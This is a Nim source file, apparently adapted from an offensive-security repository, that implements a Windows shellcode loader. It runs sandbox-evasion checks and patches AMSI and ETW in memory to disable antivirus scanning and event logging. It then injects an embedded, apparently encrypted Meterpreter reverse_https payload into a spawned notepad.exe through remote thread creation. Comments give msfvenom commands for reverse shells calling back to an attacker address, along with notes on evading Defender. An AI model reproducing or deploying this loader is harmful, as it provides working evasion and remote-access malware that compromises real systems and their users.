#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim
]#


# nim c -d:release -d:danger -d:mingw --cpu=amd64 -d:strip --opt:size src/shellcode_bin.nim
# added the "amsi_patch_bin.nim" content as a func
# added the strenc module import for a bit more obfuscation
# added the "etw_patch_bin.nim" content as a func
# added sandbox checks from NimHollow

import winim/lean
import osproc
import strformat
import dynlib
import strenc # add a bit more of obfuscation for embedded strings
import random
import times
import os

proc WeirdApi(): bool =
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000,
        0x20,
        0
    )
    if isNil(mem):
        return false
    else:
        return true

proc SleepnCheck(): bool =
    randomize()
    let dreaming = rand(5000..10000)
    let delta = dreaming - 500
    let before = now()
    sleep(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true


proc MetaSandbox(): bool =
    if SleepnCheck() == false:
        return false
    elif WeirdApi() == false:
        return false
    else:
        return true

proc Patchntdll(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc PatchAmsi(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =


    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"


when defined(windows):
        # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 EXITFUNC=thread LPORT=443 -f csharp                           
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -f csharp
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -e x64/xor -b '\x00' -f csharp
        # the xored version is caught by AV. lol.
        # stageencoder yes
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -e x64/zutto_dekiru -b '\x00' -f csharp
        # xor encoded payloads are much more detected by defender than regular one
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -b \x00\x0a\x0d --encrypt rc4 --encrypt-key japonais -f csharp


    when defined amd64:
        echo "[*] Running in x64 process"
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -f csharp
        var shellcode: array[791, byte] = [byte 0x76,0x91,0x09,0xa8,0x91,0x2e,0x8e,0x42,0x48,0x09,0xab,0x78,0x0f,0xec,0x98,
        0x2c,0xcd,0x52,0xa8,0xbb,0x1e,0x12,0x06,0xa4,0xdf,0x7d,0xcb,0x9f,0x1c,0x37,
        0x5b,0x19,0xfb,0xc6,0xf9,0x92,0x21,0x5e,0xee,0xa8,0xdb,0xe3,0x55,0x1d,0xb3,
        0x19,0x3d,0x9f,0x78,0xd5,0xa0,0x29,0x08,0x1a,0x57,0xb4,0xb7,0x15,0x44,0x44,
        0x9c,0xc2,0xad,0xd7,0x6c,0x0d,0x8b,0x33,0xe9,0x4b,0xb9,0x05,0x37,0xcd,0x12,
        0x02,0xc2,0xcd,0x1b,0x1f,0x37,0x65,0x8c,0xc2,0x9b,0xbd,0x88,0x00,0xdf,0x6e,
        0xc7,0x18,0xdc,0x17,0xea,0x15,0x95,0x47,0xa4,0x9e,0xac,0x19,0xbc,0x57,0x73,
        0xb7,0x72,0xac,0x3d,0xe2,0xd6,0x7c,0x07,0x55,0xb3,0xa5,0x81,0xb4,0xf6,0x25,
        0xf6,0x5d,0x6c,0x7e,0x0f,0x01,0x98,0x34,0x7f,0x7d,0xb7,0x0f,0xd7,0x37,0x37,
        0x25,0x6e,0x35,0xf9,0x2b,0x2f,0xe4,0xaa,0xc9,0x8a,0xf7,0xc1,0xdb,0xca,0xcb,
        0x23,0xe1,0x44,0xf9,0x10,0x2a,0xdc,0xea,0x27,0xf7,0x6b,0x86,0xb1,0xfe,0xa2,
        0x5f,0x02,0x9b,0x26,0x1b,0x18,0x4c,0xa8,0x66,0x5f,0xa2,0xf2,0x21,0x5e,0x33,
        0x19,0x6b,0xb1,0x62,0x04,0x57,0x5a,0x43,0xca,0x3f,0x0e,0x0b,0xb1,0xfa,0x46,
        0x54,0x04,0x5e,0xac,0x1b,0x60,0x4c,0x71,0x4f,0x5f,0xb7,0x07,0x39,0x86,0x5b,
        0x99,0x08,0xca,0x1a,0xf4,0x05,0xd9,0x3e,0xab,0xa4,0x04,0xe0,0x8e,0x20,0x10,
        0xd6,0x46,0x3f,0xe6,0xbb,0xe7,0x6a,0x0e,0x37,0x24,0x0a,0xb0,0x02,0x51,0xd1,
        0xbe,0x3f,0x4a,0xcd,0x72,0x60,0xbc,0x15,0x62,0x4d,0x55,0x7c,0xcb,0xd1,0xde,
        0xa0,0x03,0x21,0xb4,0x7d,0x3f,0x8a,0x95,0x98,0x96,0xa9,0xf4,0x1f,0xae,0x40,
        0xc8,0x13,0x9e,0xf9,0xb9,0xa1,0x06,0x99,0x29,0xfa,0xe2,0xa8,0x8c,0x90,0xf8,
        0x93,0x39,0x69,0x51,0x15,0x10,0x23,0x37,0x15,0xf0,0xbb,0x21,0xac,0xcf,0x49,
        0xc6,0x34,0x8e,0xe0,0x8f,0x74,0x27,0x3f,0xa1,0xf5,0x16,0xb2,0x08,0x19,0x9c,
        0xa9,0x03,0x9f,0x04,0x72,0x9a,0x39,0xff,0xc4,0x2f,0xd7,0xc5,0xc4,0xc2,0x65,
        0x00,0xe3,0xbe,0xde,0xd6,0xe4,0x11,0x03,0xac,0x53,0x2f,0x5a,0x61,0x1a,0x8c,
        0x38,0x46,0xaf,0xaa,0x17,0xe4,0xec,0x35,0xa5,0x3b,0x3b,0x11,0x36,0x28,0x62,
        0x1c,0x88,0xd5,0x9d,0x76,0x98,0xd4,0x6d,0xfe,0x67,0x1a,0xda,0x6b,0x7c,0x70,
        0x4f,0xe7,0x6a,0xa1,0xb7,0x34,0x7f,0x27,0x34,0x48,0x53,0x7c,0x61,0xce,0xdb,
        0x33,0x64,0x1e,0xa1,0x4d,0x83,0xd4,0x10,0x15,0x13,0x84,0xf7,0x2c,0x0d,0xf9,
        0x7d,0xf6,0xb1,0x9c,0xc0,0xb4,0xbb,0x21,0xd1,0xe4,0xa9,0x28,0xc7,0xfe,0xa0,
        0x8c,0xa5,0x12,0x51,0x0a,0xbc,0xdb,0xc8,0xc1,0xb3,0x2e,0x2f,0x26,0xe6,0xe5,
        0xb0,0x48,0xfb,0x82,0x1d,0x55,0xee,0x4f,0x44,0x97,0xc4,0x2c,0xb2,0xa4,0xe9,
        0x7e,0x16,0xbd,0xb9,0xf3,0x83,0x39,0xb6,0xeb,0x7b,0x9e,0xfb,0x50,0xa3,0xbc,
        0x73,0xb5,0xab,0x33,0xa3,0xf3,0x91,0xd8,0x9c,0xff,0xc1,0x3e,0xa5,0x88,0x04,
        0x72,0xef,0xcb,0x19,0xc0,0x77,0x21,0xde,0x34,0xe6,0x2b,0x25,0x27,0x43,0x19,
        0x48,0xb6,0x76,0x43,0x55,0x02,0x45,0xf6,0xfe,0x25,0xb3,0xc0,0x8b,0x00,0x3e,
        0x93,0x4a,0x84,0xa4,0x22,0x93,0x4b,0xd7,0xd6,0x46,0x6b,0x52,0xc5,0x5e,0xbf,
        0xcb,0xf2,0xa2,0xe4,0x64,0xc0,0xe8,0x58,0xff,0x5d,0xc1,0x8e,0x07,0x3b,0x39,
        0xa7,0xfd,0x10,0x2e,0x36,0xcd,0x03,0x7a,0xf4,0x57,0xdd,0x1d,0xfc,0xfe,0xd7,
        0x74,0x82,0x1d,0x70,0xd2,0x6e,0xe2,0xdb,0x72,0xc7,0xb4,0xec,0xfe,0x2c,0x6f,
        0x11,0x84,0x6b,0x07,0x8f,0x30,0x38,0x4c,0x36,0x57,0x58,0xf0,0x88,0x21,0xb9,
        0x0e,0x2f,0xf2,0x8c,0xce,0x13,0x6e,0xf5,0xd1,0xa6,0x54,0xdd,0xd1,0x81,0x3f,
        0xfe,0xf2,0x32,0x14,0x70,0x3b,0x64,0x18,0xeb,0xa8,0xa2,0xb2,0x6c,0x49,0xbb,
        0xc5,0xf9,0x33,0xb0,0xc8,0x1d,0x49,0x6d,0x8b,0x9c,0x29,0x83,0xe0,0xec,0x7d,
        0xfa,0xc7,0x93,0x2a,0x6d,0x68,0x27,0xa4,0x1e,0xc5,0x8d,0xa0,0xef,0x64,0x50,
        0x5e,0x98,0xd7,0xb1,0x44,0x66,0x6e,0x15,0xdc,0x17,0x20,0xd6,0xaf,0xaf,0x27,
        0x72,0x0e,0x5f,0xa8,0x5a,0x75,0x04,0xeb,0xed,0x5d,0xd1,0x79,0x33,0xee,0xd4,
        0xe8,0x53,0x33,0x39,0x9d,0x7b,0x5a,0xa6,0x83,0x2d,0xf9,0x2a,0x21,0x65,0x66,
        0x07,0x65,0xfb,0xd9,0xe3,0x91,0xd5,0x52,0x4b,0x8c,0xf4,0xeb,0xe1,0xf8,0x4d,
        0x78,0xa5,0x64,0xf1,0x5a,0xbb,0x5a,0x5d,0x24,0x22,0x57,0xd8,0x94,0xfb,0x32,
        0xac,0xaa,0xb1,0x2f,0x3e,0x92,0xf1,0x09,0xb3,0xec,0x28,0x30,0x3e,0xd8,0x7c,
        0x45,0xdf,0x3d,0xa4,0xe9,0xf3,0xa5,0x56,0x8e,0xe6,0xcf,0x7b,0x11,0x15,0x3c,
        0xc4,0x79,0x1f,0x86,0x69,0xfb,0x3d,0x1e,0x76,0xb9,0xf2,0xa7,0x16,0x4b,0x03,
        0xc5,0x99,0xa2,0x2b,0x08,0x33,0x68,0xe9,0x0e,0x89,0x73,0xa3,0x5c,0x3f,0x9f,
        0x69,0xe6,0x42,0x33,0x5c,0x7c,0x9f,0x86,0x25,0x58,0x38]
    elif defined i386:
        discard

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        if MetaSandbox() == false:
            quit()
        var amsi_success = PatchAmsi()
        echo fmt"[*] AMSI disabled: {bool(amsi_success)}"
        var etw_success = Patchntdll()
        echo fmt"[*] ETW blocked by patch: {bool(etw_success)}"
        injectCreateRemoteThread(shellcode)
